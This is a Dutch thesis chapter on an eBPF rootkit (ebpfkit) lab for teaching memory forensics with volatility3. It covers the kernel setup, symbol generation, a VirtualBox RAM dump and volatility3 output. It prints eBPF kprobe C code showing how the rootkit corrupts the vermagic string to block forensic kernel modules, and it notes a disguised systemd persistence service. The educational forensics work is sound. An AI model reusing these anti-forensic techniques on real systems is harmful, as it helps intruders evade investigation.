\chapter{\IfLanguageName{dutch}{Proof of Concept als leeromgeving}{Proof of Concept als leeromgeving}}%
\label{ch:proof-of-concept}

Dit hoofdstuk zal het setup-proces bespreken van de rootkit die gevonden is in iteratie 2 van de methodologie.
Hierin zal getoond worden hoe de rootkit is opgezet en hoe de studenten de rootkit kunnen detecteren met volatility3.

\section{Introductie}

\subsection{Opzet}
De rootkit die gekozen is tijdens het vorige hoofdstuk staat op GitHub, hierop staat ook uitgebreid uitgelegd hoe het te gebruiken.
Tijdens het onderzoek is er een GitHub-repository opgezet waarin er 2 scripts gemaakt zijn.
Om de volledige functionaliteit van de rootkit te kunnen tonen voor educatieve doeleinden zijn er 2 virtuele machines nodig.
Bij de setup is het belangrijk dat de kernelversie precies hetzelfde blijft, dus staat dit vast op versie 5.15.0-179.
Dit is belangrijk omdat de kernelversie exact hetzelfde moet zijn voor het ISF-bestand en de dump van het RAM-geheugen.

\begin{minted}{bash}
sudo apt-mark hold linux-image-5.15.0-179-generic
sudo apt-mark hold linux-headers-5.15.0-179-generic
sudo apt-mark hold linux-modules-5.15.0-179-generic
sudo apt-mark hold linux-modules-extra-5.15.0-179-generic
sudo apt-mark hold linux-image-generic
sudo apt-mark hold linux-headers-generic
\end{minted}

Een eBPF-rootkit begeeft zich in het RAM-geheugen van de computer, waardoor het niet meer aanwezig is als er een reboot gebeurt.
Dit wordt opgelost in het script door een systemd-service aan te maken die bij het opstarten van het systeem de eBPF-rootkit in het geheugen laadt.
Dit is een manier om de rootkit toch te detecteren, maar dit is de eenvoudigste manier en geeft de studenten toch de mogelijkheid om de rootkit op te sporen als ze hun best doen.

\subsection{Benodigdheden om volatility3 te gebruiken}
Geheugenforensisch onderzoek, een methode die besproken is in het hoofdstuk 'Stand van zaken', kan gebruikt worden om een rootkit op te sporen.
Hiervoor is volatility3 gebruikt, wat 2 verschillende onderdelen nodig heeft. Het eerste is een ISF json-bestand.
Het is mogelijk om deze online te vinden, maar omdat er gewerkt wordt met een heel specifieke versie die niet online te vinden was, wordt https://github.com/Abyss-W4tcher/volatility3-symbols gebruikt.
Hiervoor is dwarf2json gebruikt; hierbij is er ook een GitHub-pagina die duidelijk uitlegt hoe het gebruik ervan werkt: https://github.com/volatilityfoundation/dwarf2json.
Het gebruik hiervan duurt lang, vooral als de VM weinig RAM-geheugen heeft.
Om het bestand /usr/lib/debug/boot/vmlinux-5.15.0-179-generic te krijgen, moet je apt install linux-image-5.15.0-179-dbgsym installeren, wat de benodigde DWARF-symbolen bevat.

\begin{minted}{bash}
./dwarf2json linux \
    --elf "/usr/lib/debug/boot/vmlinux-5.15.0-179-generic" \
    --system-map "/boot/System.map-5.15.0-179-generic" \
    > "/tmp/linux-ubuntu-focal-5.15.0-179-generic.json"
\end{minted}

Net omdat dit proces zo lang duurt, is dit al gedaan voor de studenten en moet dit bestand overgezet worden naar GitHub.

\subsection{RAM-dump via LiME}
Het tweede deel dat vereist is voor volatility3 is een geheugendump van het RAM-geheugen. Hiervoor wordt LiME vaak gebruikt, omdat het moeilijk is om te manipuleren gezien het via een LKM ingeladen wordt. Hiervan is er ook een GitHub aanwezig die eenvoudig uitlegt hoe het gebruikt wordt. Tijdens het opzetten van de testomgeving werkte LiME niet omdat ebpfkit LKM's blokkeert. Dit doet het om zichzelf te beschermen tegen geheugenforensisch onderzoek. In het hoofdstuk 'Stand van zaken' is al aangehaald dat het belangrijk is dat je de besmette computer niet mag vertrouwen. Dit is daar een voorbeeld van. Gelukkig staat de rootkit op een virtuele omgeving en is het eenvoudig om een dump te nemen van het RAM-geheugen:

\begin{minted}{bash}
./VBoxManage list runningvms
./VBoxManage controlvm "ebpfkit" pause
./VBoxManage debugvm "ebpfkit" dumpvmcore --filename= C:\Users\username\Downloads\memory_dump.elf
./VBoxManage controlvm "ebpfkit" resume
\end{minted}

\subsection{Waarom ebpfkit LKM's niet toelaat}

Dit is de output van het dmesg commando:
\begin{verbatim}
user@user:~/LiME/src$ sudo dmesg | tail -30
[  470.125668] .system-health[1251] is installing a program with 
bpf_probe_write_user helper that may corrupt user memory!
\end{verbatim}

\texttt{.system-health} is de systemd-service die ervoor zorgt dat de eBPF-rootkit 
ingeladen wordt als het systeem herstart. Zoals besproken in hoofdstuk 2 
gebruiken eBPF-rootkits de helperfunctie \texttt{bpf\_probe\_write\_user} om vanuit 
kernel-context te schrijven naar user-space geheugen van een willekeurig proces. 
Als dit gebeurt, wordt dit altijd gemeld door de kernel.

Voordat de techniek uitgelegd wordt, is het nuttig om te kijken naar wat 
volatility3 effectief heeft gevonden in de RAM-dump. De volgende eBPF-programma's 
waren actief op het systeem:

\begin{verbatim}
0xccbb80053000  __x64_sys_finit 8e961e4bbcad9f1e   BPF_PROG_TYPE_KPROBE
0xccbb80649000  _vfs_read       2e38195ad756391a   BPF_PROG_TYPE_KPROBE
0xccbb81eb5000  _vfs_open       e571209159c34cd3   BPF_PROG_TYPE_KPROBE
\end{verbatim}

Dit zijn exact de hooks die samenwerken om \texttt{insmod} te blokkeren. 
De aanval verloopt in drie stappen.

\subsubsection*{Stap 1 — \texttt{\_vfs\_open}: detecteer dat insmod een \texttt{.ko} bestand opent}

De kprobe op \texttt{\_vfs\_open} (adres \texttt{0xccbb81eb5000} in de dump) 
houdt bij wanneer het proces \texttt{insmod} een bestand opent. De bestandspointer 
wordt opgeslagen in een BPF-map voor gebruik in de volgende stap:

\begin{minted}{c}
SEC("kprobe/_vfs_open")
int kprobe_vfs_open(struct pt_regs *ctx) {
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));

    // Controleer of het proces "insmod" is
    if (!str_equals(comm, "insmod")) return 0;

    // Sla de bestandspointer op voor later gebruik
    u64 pid = bpf_get_current_pid_tgid();
    struct file *file = (struct file *)PT_REGS_PARM2(ctx);
    bpf_map_update_elem(&open_file_map, &pid, &file, BPF_ANY);
    return 0;
}
\end{minted}

\subsubsection*{Stap 2 — \texttt{\_vfs\_read}: onderschep de buffer pointer}

De kprobe op \texttt{\_vfs\_read} (adres \texttt{0xccbb80649000}) vuurt op het 
moment dat de kernel de \texttt{.ko}-data in de user-space buffer schrijft. 
De pointer naar die buffer wordt opgeslagen zodat hij later overschreven kan worden:

\begin{minted}{c}
SEC("kprobe/_vfs_read")
int kprobe_vfs_read(struct pt_regs *ctx) {
    u64 pid = bpf_get_current_pid_tgid();

    // Is dit een insmod-proces dat we volgen?
    struct file **filep = bpf_map_lookup_elem(&open_file_map, &pid);
    if (!filep) return 0;

    // Sla de user-space buffer pointer op
    // PT_REGS_PARM2 = char __user *buf
    struct read_args_t args = {};
    args.buf = (char *)PT_REGS_PARM2(ctx);
    bpf_map_update_elem(&read_args_map, &pid, &args, BPF_ANY);
    return 0;
}
\end{minted}

\subsubsection*{Stap 3 — \texttt{\_\_x64\_sys\_finit\_module}: corruptie via \texttt{bpf\_probe\_write\_user}}

Dit is de kern van de blokkering. De kprobe op \texttt{finit\_module} 
(adres \texttt{0xccbb80053000}) vuurt op het moment dat \texttt{insmod} 
de module aan de kernel aanbiedt. Op dat moment overschrijft de rootkit 
het \texttt{vermagic}-veld in de user-space buffer met een foute waarde:

\begin{minted}{c}
SEC("kprobe/__x64_sys_finit_module")
int kprobe_finit_module(struct pt_regs *ctx) {
    u64 pid = bpf_get_current_pid_tgid();

    struct read_args_t *args = bpf_map_lookup_elem(&read_args_map, &pid);
    if (!args) return 0;

    // Overschrijf de vermagic string met een foute versie
    char fake_vermagic[] = "5.15.0-000-generic SMP mod_unload \0";

    bpf_probe_write_user(
        args->buf + VERMAGIC_OFFSET, // doel: user-space buffer van insmod
        fake_vermagic,               // bron: corrupte vermagic string
        sizeof(fake_vermagic)        // lengte
    );
    return 0;
}
\end{minted}

De kernel leest vervolgens de gecorrumpeerde buffer en vergelijkt de 
\texttt{vermagic}-string met de verwachte waarde:

\begin{verbatim}
Module vermagic:  "5.15.0-000-generic SMP mod_unload"  <- nep (door ebpfkit)
Kernel verwacht:  "5.15.0-179-generic SMP mod_unload"  <- echt
-> "Module has wrong symbol version"
\end{verbatim}

Dit verklaart exact de foutmelding die tijdens het onderzoek verscheen bij 
het proberen inladen van LiME. Het bestand op schijf is correct en de 
headers zijn correct geïnstalleerd, maar de rootkit corrumpeert de data 
in RAM tijdens het inladen — onzichtbaar voor de gebruiker en voor tools 
die enkel het bestandssysteem controleren.

De volledige aanvalsketen ziet er als volgt uit:

\begin{verbatim}
insmod lime-5.15.0-179-generic.ko
    |
    +-- open("lime.ko")
    |       ^ kprobe/_vfs_open [0xccbb81eb5000]
    |         sla bestandspointer op in BPF-map
    |
    +-- read(fd, buf, size)
    |       ^ kprobe/_vfs_read [0xccbb80649000]
    |         sla user-space buffer pointer op in BPF-map
    |
    +-- finit_module(fd, buf, flags)
            ^ kprobe/__x64_sys_finit_module [0xccbb80053000]
              bpf_probe_write_user(buf + vermagic_offset, fake, len)
              -> kernel leest corrupte vermagic
              -> "wrong symbol version" -> module geweigerd
\end{verbatim}

Omdat de rootkit zich in het RAM-geheugen bevindt en user-space buffers 
manipuleert zonder het bestandssysteem aan te raken, faalt elke 
acquisitiepoging via \texttt{insmod}. De oplossing in deze testomgeving 
was dan ook om de RAM-dump rechtstreeks via VirtualBox te nemen, 
waarbij de gemanipuleerde user-space laag volledig omzeild wordt.


\subsection{Output volatility3}
Nu beide voorwaarden voor volatility3 compleet zijn, kan het volgende commando gebruikt worden.
Hierbij is het belangrijk dat het ISF-bestand aanwezig is onder {volatility3-develop symbolsh linux linux-ubuntu-focal-5.15.0-179-generic.json}.

\begin{minted}{bash}
python vol.py -s "C:\Users\elias\Downloads\volatility3-develop\volatility3-develop\symbols" -f "C:\Users\elias\Downloads\volatility3-develop\volatility3-develop\memory_dump_clean.elf" linux.pstree.PsTree
\end{minted}

Het belangrijkste van de output is: \begin{verbatim} 0x8a8dd09ae600 3575 3575 1 .system-health. \end{verbatim} 

\begin{minted}{bash}
python vol.py -s "C:\Users\elias\Downloads\volatility3-develop\volatility3-develop\symbols" -f "C:\Users\elias\Downloads\volatility3-develop\volatility3-develop\memory_dump_clean.elf" linux.ebpf.EBPF
\end{minted}

\begin{verbatim}
Volatility 3 Framework 2.28.1
Progress:  100.00               Stacking attempts finished
Address Name    Tag     Type

0xccbb8005d000  -               e3dbd137be8d6168        BPF_PROG_TYPE_CGROUP_DEVICE
0xccbb80065000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb8006d000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb80125000  -               0ecd07b7b633809f        BPF_PROG_TYPE_CGROUP_DEVICE
0xccbb80121000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb80123000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb80251000  -               e3dbd137be8d6168        BPF_PROG_TYPE_CGROUP_DEVICE
0xccbb80535000  -               c8b47a902f1cc68b        BPF_PROG_TYPE_CGROUP_DEVICE
0xccbb80655000  -               8b9c33f36f812014        BPF_PROG_TYPE_CGROUP_DEVICE
0xccbb80253000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb80255000  -               6deef7357e7b4530        BPF_PROG_TYPE_CGROUP_SKB
0xccbb80051000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb8004f000  kprobe__64_sys_ 558728e464da7dd1        BPF_PROG_TYPE_KPROBE
0xccbb81eb5000  _vfs_open       e571209159c34cd3        BPF_PROG_TYPE_KPROBE
0xccbb80053000  __x64_sys_finit 8e961e4bbcad9f1e        BPF_PROG_TYPE_KPROBE
0xccbb8013b000  kretprobe__64_s fbef67bdb241355b        BPF_PROG_TYPE_KPROBE
0xccbb8013d000  kretprobe__64_s 8149a9c1ea8fdca5        BPF_PROG_TYPE_KPROBE
0xccbb8013f000  kretprobe__32_c 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb804e7000  kprobe__64_sys_ 41b087e993a64786        BPF_PROG_TYPE_KPROBE
0xccbb804e9000  kprobe__64_sys_ fcea3ad7c5dc4dc2        BPF_PROG_TYPE_KPROBE
0xccbb804eb000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb8062f000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb81f06000  kprobe__64_sys_ 9a5517ec1956fc75        BPF_PROG_TYPE_KPROBE
0xccbb81f10000  kprobe__64_sys_ 22f1156e32b401da        BPF_PROG_TYPE_KPROBE
0xccbb80631000  kprobe__64_sys_ 558728e464da7dd1        BPF_PROG_TYPE_KPROBE
0xccbb80633000  kretprobe__32_c 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb80647000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb80649000  _vfs_read       2e38195ad756391a        BPF_PROG_TYPE_KPROBE
0xccbb8064b000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb81f1a000  _vfs_getattr    e571209159c34cd3        BPF_PROG_TYPE_KPROBE
0xccbb80707000  kretprobe__64_s 72a675d136f86ad3        BPF_PROG_TYPE_KPROBE
0xccbb806f2000  __x64_sys_getde 2b9a2ad203222920        BPF_PROG_TYPE_KPROBE
0xccbb806fb000  xdp_ingress_del b489bab0c6d5985c        BPF_PROG_TYPE_XDP
0xccbb80703000  kretprobe__64_s 5faefaeb0d1fbdec        BPF_PROG_TYPE_KPROBE
0xccbb8322b000  egress_dispatch f7ef2bda3a4006f0        BPF_PROG_TYPE_SCHED_CLS
0xccbb81f42000  sqlite_conn_que 13cc21da02a32f77        BPF_PROG_TYPE_KPROBE
\end{verbatim}

BPF\_PROG\_TYPE\_CGROUP\_SKB en BPF\_PROG\_TYPE\_CGROUP\_DEVICE zijn de BPF's die altijd aanwezig zijn op een systeem. De BPF\_PROG\_TYPE\_KPROBE, XDP \& SCHED\_CLS zijn afkomstig van de rootkit.